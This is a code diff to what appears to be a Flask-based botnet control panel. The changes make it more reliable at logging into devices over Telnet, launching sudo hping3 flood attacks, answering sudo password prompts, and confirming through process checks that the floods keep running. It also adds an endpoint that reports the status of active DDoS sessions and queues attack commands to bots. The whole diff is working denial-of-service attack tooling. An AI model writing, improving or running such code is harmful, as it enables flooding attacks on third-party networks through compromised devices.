@@ -153,7 +153,7 @@ class DatabaseManager:
             return attack_id
 
     def execute_telnet_login_and_send(self, ip, username, password, command):
-        """Establish Telnet connection, login, and send command"""
+        """Establish Telnet connection, login, send command, and verify execution"""
         tn = None
         try:
             logging.info(f"Attempting Telnet connection to {ip}:23")
@@ -161,8 +161,9 @@ class DatabaseManager:
             logging.info(f"Telnet connection to {ip} established")
 
             # Handle login prompt
-            login_patterns = [b"login: ", b"Username: "]
+            login_patterns = [b"login: ", b"Username: ", b"Login: "]
             index, match, response = tn.expect(login_patterns, timeout=15)
+            logging.info(f"Login response from {ip}: {response.decode(errors='ignore')}")
             
             if not match:
                 logging.error(f"No login prompt detected on {ip}")
@@ -171,11 +172,12 @@ class DatabaseManager:
 
             # Send username
             tn.write(username.encode() + b"\n")
-            logging.info(f"Sent username to {ip}")
+            logging.info(f"Sent username '{username}' to {ip}")
 
             # Handle password prompt
-            password_patterns = [b"Password: ", b"password: "]
+            password_patterns = [b"Password: ", b"password: ", b"Password:", b"password:"]
             index, match, response = tn.expect(password_patterns, timeout=10)
+            logging.info(f"Password prompt response from {ip}: {response.decode(errors='ignore')}")
             
             if not match:
                 logging.error(f"No password prompt detected on {ip}")
@@ -186,34 +188,120 @@ class DatabaseManager:
             tn.write((password or "").encode() + b"\n")
             logging.info(f"Sent password to {ip}")
 
-            # Wait for shell prompt
-            shell_patterns = [b"$", b"#", b">"]
+            # Wait for shell prompt after login
+            shell_patterns = [b"$ ", b"# ", b"> ", b"$", b"#", b">"]
             index, match, response = tn.expect(shell_patterns, timeout=15)
+            logging.info(f"Shell prompt response from {ip}: {response.decode(errors='ignore')}")
             
             if not match:
-                logging.error(f"No shell prompt detected on {ip}")
+                logging.error(f"No shell prompt detected on {ip} after login")
                 tn.close()
                 return None
 
-            # Send command
-            logging.info(f"Sending command to {ip}: {command}")
+            logging.info(f"Successfully logged into {ip}, sending command: {command}")
+            
+            # Send the sudo hping3 command
             tn.write(command.encode() + b"\n")
             time.sleep(2)
 
-            # Handle sudo prompt if needed
-            sudo_pattern = b"[sudo] password for"
-            hping_patterns = [b"HPING", b"hping in flood mode"]
+            # Check for sudo password prompt specifically
+            sudo_patterns = [
+                b"[sudo] password for",
+                b"Password:",
+                b"password:",
+                b"Enter password:"
+            ]
             
-            patterns = [sudo_pattern] + hping_patterns + shell_patterns
-            index, match, response = tn.expect(patterns, timeout=20)
+            # Also check for hping3 startup messages
+            hping_patterns = [
+                b"HPING",
+                b"hping",
+                b"--- hping statistic ---",
+                b"flood mode"
+            ]
             
-            if match and sudo_pattern in match.group(0):
-                logging.info(f"Sudo prompt detected on {ip}, sending password")
-                tn.write(password.encode() + b"\n")
-                time.sleep(2)
+            # And error patterns
+            error_patterns = [
+                b"command not found",
+                b"Permission denied",
+                b"sudo: command not found",
+                b"hping3: command not found"
+            ]
+            
+            # Combine all patterns for initial response
+            all_patterns = sudo_patterns + hping_patterns + error_patterns + shell_patterns
+            
+            index, match, response = tn.expect(all_patterns, timeout=20)
+            response_text = response.decode(errors='ignore')
+            logging.info(f"Command response from {ip}: {response_text}")
 
-            logging.info(f"Command executed successfully on {ip}")
-            return tn
+            if match:
+                matched_pattern = match.group(0)
+                
+                # Check if it's a sudo password prompt
+                if any(pattern in matched_pattern for pattern in sudo_patterns):
+                    logging.info(f"Sudo password prompt detected on {ip}, sending password")
+                    tn.write(password.encode() + b"\n")
+                    time.sleep(3)
+                    
+                    # After sending sudo password, check for hping3 execution
+                    post_sudo_patterns = hping_patterns + error_patterns + shell_patterns
+                    index2, match2, response2 = tn.expect(post_sudo_patterns, timeout=15)
+                    response2_text = response2.decode(errors='ignore')
+                    logging.info(f"Post-sudo response from {ip}: {response2_text}")
+                    
+                    if match2:
+                        matched_pattern2 = match2.group(0)
+                        
+                        # Check if hping3 started successfully
+                        if any(pattern in matched_pattern2 for pattern in hping_patterns):
+                            logging.info(f"✓ Hping3 successfully started on {ip}")
+                            
+                            # Verify it's actually running by checking process
+                            time.sleep(2)
+                            self.verify_hping3_running(tn, ip)
+                            return tn
+                        
+                        # Check for errors
+                        elif any(pattern in matched_pattern2 for pattern in error_patterns):
+                            logging.error(f"✗ Hping3 failed to start on {ip}: {response2_text}")
+                            tn.close()
+                            return None
+                        
+                        else:
+                            logging.warning(f"? Unknown response after sudo on {ip}: {response2_text}")
+                            # Still try to verify if hping3 is running
+                            self.verify_hping3_running(tn, ip)
+                            return tn
+                    
+                    else:
+                        logging.error(f"✗ No response after sudo password on {ip}")
+                        tn.close()
+                        return None
+                
+                # Check if hping3 started directly (no sudo needed)
+                elif any(pattern in matched_pattern for pattern in hping_patterns):
+                    logging.info(f"✓ Hping3 started directly on {ip} (no sudo required)")
+                    time.sleep(2)
+                    self.verify_hping3_running(tn, ip)
+                    return tn
+                
+                # Check for immediate errors
+                elif any(pattern in matched_pattern for pattern in error_patterns):
+                    logging.error(f"✗ Command failed on {ip}: {response_text}")
+                    tn.close()
+                    return None
+                
+                # Shell prompt returned - command may have failed silently
+                elif any(pattern in matched_pattern for pattern in shell_patterns):
+                    logging.warning(f"? Shell prompt returned immediately on {ip} - checking if hping3 is running")
+                    self.verify_hping3_running(tn, ip)
+                    return tn
+            
+            else:
+                logging.warning(f"? No expected pattern matched on {ip} - checking if hping3 is running")
+                self.verify_hping3_running(tn, ip)
+                return tn
 
         except Exception as e:
             logging.error(f"Telnet execution failed for {ip}: {e}")
@@ -224,24 +312,48 @@ class DatabaseManager:
                     pass
             return None
 
-    def stop_telnet_session(self, ip, tn):
-        """Stop telnet session gracefully"""
+    def verify_hping3_running(self, tn, ip):
+        """Verify if hping3 process is actually running on the device"""
         try:
-            logging.info(f"Stopping Telnet session for {ip}")
-            # Send interrupt signals
-            tn.write(b"\x03")  # Ctrl+C
+            logging.info(f"Verifying hping3 is running on {ip}")
+            
+            # Send Ctrl+C first to get to a shell prompt
+            tn.write(b"\x03")
             time.sleep(1)
-            tn.write(b"\x1a")  # Ctrl+Z
-            time.sleep(1)
-            tn.close()
-            logging.info(f"Telnet session closed for {ip}")
-            return True
+            
+            # Clear any output
+            tn.read_very_eager()
+            
+            # Check running processes for hping3
+            tn.write(b"ps aux | grep hping3 | grep -v grep\n")
+            time.sleep(2)
+            
+            # Read the response
+            response = tn.read_very_eager()
+            response_text = response.decode(errors='ignore')
+            logging.info(f"Process check response from {ip}: {response_text}")
+            
+            if "hping3" in response_text and "--flood" in response_text:
+                logging.info(f"✓ Confirmed: hping3 is running on {ip}")
+                return True
+            else:
+                logging.warning(f"✗ hping3 not found in process list on {ip}")
+                
+                # Try alternative check with pgrep
+                tn.write(b"pgrep -f hping3\n")
+                time.sleep(2)
+                response2 = tn.read_very_eager()
+                response2_text = response2.decode(errors='ignore')
+                
+                if response2_text.strip() and response2_text.strip().isdigit():
+                    logging.info(f"✓ Confirmed: hping3 PID {response2_text.strip()} found on {ip}")
+                    return True
+                else:
+                    logging.error(f"✗ hping3 is NOT running on {ip}")
+                    return False
+                    
         except Exception as e:
-            logging.error(f"Error stopping Telnet session for {ip}: {e}")
-            try:
-                tn.close()
-            except:
-                pass
+            logging.error(f"Error verifying hping3 on {ip}: {e}")
             return False
 
 # Global variables
@@ -584,6 +696,11 @@ def start_attack():
                 cursor.execute('''
                     INSERT INTO commands (command, target_ip, attack_type, status, bot_ip)
                     VALUES (?, ?, ?, 'pending', ?)
+                    ON CONFLICT(bot_ip) DO UPDATE SET
+                    command=excluded.command,
+                    target_ip=excluded.target_ip,
+                    attack_type=excluded.attack_type,
+                    status='pending'
                 ''', (json.dumps(command), target, attack_type, bot_ip))
             else:
                 # Create command for all online bots
@@ -808,6 +925,40 @@ def stop_telnet_ddos():
         'message': response_message,
         'errors': errors
     })
+
+@app.route('/check-attack-status', methods=['GET'])
+def check_attack_status():
+    """Check status of active attacks"""
+    try:
+        global active_telnet_sessions
+        
+        active_attacks = []
+        for ip, tn in active_telnet_sessions.items():
+            try:
+                # Try to verify if hping3 is still running
+                if db_manager.verify_hping3_running(tn, ip):
+                    status = "active"
+                else:
+                    status = "stopped"
+                
+                active_attacks.append({
+                    'ip': ip,
+                    'status': status
+                })
+            except:
+                active_attacks.append({
+                    'ip': ip,
+                    'status': 'unknown'
+                })
+        
+        return jsonify({
+            'total_sessions': len(active_telnet_sessions),
+            'attacks': active_attacks
+        })
+        
+    except Exception as e:
+        logging.error(f"Error checking attack status: {e}")
+        return jsonify({'error': str(e)}), 500
 
 def main():
     """Main entry point"""
